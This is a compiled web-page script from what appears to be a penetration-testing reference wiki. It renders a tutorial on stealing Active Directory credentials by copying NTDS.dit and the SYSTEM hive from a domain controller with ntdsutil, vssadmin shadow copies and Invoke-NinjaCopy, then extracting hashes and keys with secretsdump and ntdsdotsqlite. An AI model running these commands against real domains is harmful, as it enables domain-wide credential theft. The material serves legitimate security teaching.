import{_ as i,c as e,a5 as a,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"NTDS secrets","description":"MITRE ATT&CK™ Sub-technique T1003.003","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1003.003","authors":"ShutdownRepo, almandin, sckdev"},"headers":[],"relativePath":"ad/movement/credentials/dumping/ntds.md","filePath":"ad/movement/credentials/dumping/ntds.md","lastUpdated":1724982529000}'),n={name:"ad/movement/credentials/dumping/ntds.md"};function h(r,s,o,l,d,p){return t(),e("div",null,s[0]||(s[0]=[a(`<h1 id="ntds-secrets" tabindex="-1">NTDS secrets <a class="header-anchor" href="#ntds-secrets" aria-label="Permalink to &quot;NTDS secrets&quot;">​</a></h1><p>NTDS (Windows NT Directory Services) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The NTDS.dit file is a database that stores the Active Directory data (including users, groups, security descriptors and password hashes). This file is stored on the domain controllers.</p><p>Once the secrets are extracted, they can be used for various attacks: <a href="./../bruteforcing/spraying">credential spraying</a>, <a href="./../bruteforcing/stuffing">stuffing</a>, <a href="./../shuffling">shuffling</a>, <a href="./../cracking">cracking</a>, <a href="./../../ntlm/pth">pass-the-hash</a>, <a href="./../../kerberos/ptk">overpass-the-hash</a> or <a href="./../../kerberos/forged-tickets/">silver or golden tickets</a>.</p><h2 id="_1-exfiltration" tabindex="-1">1. Exfiltration <a class="header-anchor" href="#_1-exfiltration" aria-label="Permalink to &quot;1. Exfiltration&quot;">​</a></h2><p>Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can&#39;t be copied like any other file. In order to exfiltrate it from a live domain controller and extract password hashes from it, many techniques can be used.</p><p>Just like with <a href="./sam-and-lsa-secrets">SAM &amp; LSA secrets</a>, the SYSTEM registry hive contains enough info to decrypt the NTDS.dit data. The hive file (<code>\\system32\\config\\system</code>) can either be exfiltrated the same way the NTDS.dit file is, or it can be exported with <code>reg save HKLM\\SYSTEM &#39;C:\\Windows\\Temp\\system.save&#39;</code>.</p><h3 id="ad-maintenance-ntdsutil" tabindex="-1">AD maintenance (NTDSUtil) <a class="header-anchor" href="#ad-maintenance-ntdsutil" aria-label="Permalink to &quot;AD maintenance (NTDSUtil)&quot;">​</a></h3><p>NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to <code>C:\\Windows\\Temp</code>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntdsutil</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;activate instance ntds&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ifm&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;create full C:\\Windows\\Temp\\NTDS&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> quit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> quit</span></span></code></pre></div><p>The following files can then be exported</p><ul><li><code>C:\\Windows\\Temp\\NTDS\\Active Directory\\ntds.dit</code></li><li><code>C:\\Windows\\Temp\\NTDS\\registry\\SYSTEM</code></li></ul><div class="warning custom-block"><p>If the NTDS database is very large (several gigabytes), the generation of a defragmented backup with ntdsutil consumes a lot of CPU and disk resources on the server, which can cause slowdowns and other undesirable effects on the domain controller.</p></div><h3 id="volume-shadow-copy-vssadmin" tabindex="-1">Volume Shadow Copy (VSSAdmin) <a class="header-anchor" href="#volume-shadow-copy-vssadmin" aria-label="Permalink to &quot;Volume Shadow Copy (VSSAdmin)&quot;">​</a></h3><p>VSS (Volume Shadow Copy) is a Microsoft Windows technology, implemented as a service, that allows the creation of backup copies of files or volumes, even when they are in use. The following command will create the shadow copy and will print two values that will be used later: the ID and the Name of the shadow copy.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">vssadmin</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> create</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shadow</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /for=C:</span></span></code></pre></div><p>Once the VSS is created for the target drive, it is then possible to copy the target files from it.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">copy</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ShadowCopyName</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\W</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">indows</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\N</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TDS</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\N</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TDS.dit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> C:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\W</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">indows</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">emp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">tds.dit.save</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">copy</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ShadowCopyName</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\W</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">indows</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\S</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ystem32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\c</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">onfig</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\S</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">YSTEM</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> C:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\W</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">indows</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">emp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ystem.save</span></span></code></pre></div><p>Once the required files are exfiltrated, the shadow copy can be removed</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">vssadmin</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> delete</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shadows</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /shadow=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ShadowCopyId</span></span></code></pre></div><div class="tip custom-block"><p>This attack can be carried out with <a href="https://github.com/SecureAuthCorp/impacket/" target="_blank" rel="noreferrer">Impacket</a>&#39;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump</a> with the <code>-use-vss</code> option. Additionaly, the <code>-exec-method</code> option can be set to <code>smbexec</code>, <code>wmiexec</code> or <code>mmcexec</code> to specify on which remote command execution method to rely on for the process.</p></div><h3 id="ntfs-structure-parsing" tabindex="-1">NTFS structure parsing <a class="header-anchor" href="#ntfs-structure-parsing" aria-label="Permalink to &quot;NTFS structure parsing&quot;">​</a></h3><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noreferrer">Invoke-NinjaCopy</a> is a PowerShell script part of the PowerSploit suite able to &quot;copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This technique is stealthier than the others.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Invoke-NinjaCopy.ps1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Path</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;C:\\Windows\\NTDS\\NTDS.dit&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -LocalDestination</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;C:\\Windows\\Temp\\ntds.dit.save&quot;</span></span></code></pre></div><h2 id="_2-parsing" tabindex="-1">2. Parsing <a class="header-anchor" href="#_2-parsing" aria-label="Permalink to &quot;2. Parsing&quot;">​</a></h2><p>Once the required files are exfiltrated, they can be parsed by tools like <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump</a> (Python, part of <a href="https://github.com/SecureAuthCorp/impacket/" target="_blank" rel="noreferrer">Impacket</a>) or <a href="https://github.com/c-sto/gosecretsdump" target="_blank" rel="noreferrer">gosecretsdump</a> (Go, faster for big files).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">secretsdump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ntds</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.dit.save</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -system</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> system.save</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LOCAL</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">gosecretsdump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ntds</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.dit.save</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -system</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> system.save</span></span></code></pre></div><h2 id="ntds-directory-parsing-and-extraction" tabindex="-1">NTDS Directory parsing and extraction <a class="header-anchor" href="#ntds-directory-parsing-and-extraction" aria-label="Permalink to &quot;NTDS Directory parsing and extraction&quot;">​</a></h2><p>With the required files, it is possible to extract more information than just secrets. The NTDS file is responsible for storing the entire directory, with users, groups, OUs, trusted domains etc... This data can be retrieved by parsing the NTDS with tools like <a href="https://github.com/almandin/ntdsdotsqlite" target="_blank" rel="noreferrer">ntdsdotsqlite</a>. With the NTDS alone, objects can be extracted from the NTDS such as user and machine accounts, with a lot of information about them: descriptions, user account control flags, last logon and password change timestamps etc. This information is stored as an SQLite database which is easier to browse and query.</p><p>With the <code>SYSTEM</code> hive available it is able to extract credentials as well: NT and LM hashes, supplemental credentials such as kerberos keys, cleartext passwords and password hash history.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntdsdotsqlite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.dit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.sqlite</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntdsdotsqlite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.dit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ntds.sqlite</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --system</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SYSTEM.hive</span></span></code></pre></div>`,30)]))}const g=i(n,[["render",h]]);export{k as __pageData,g as default};
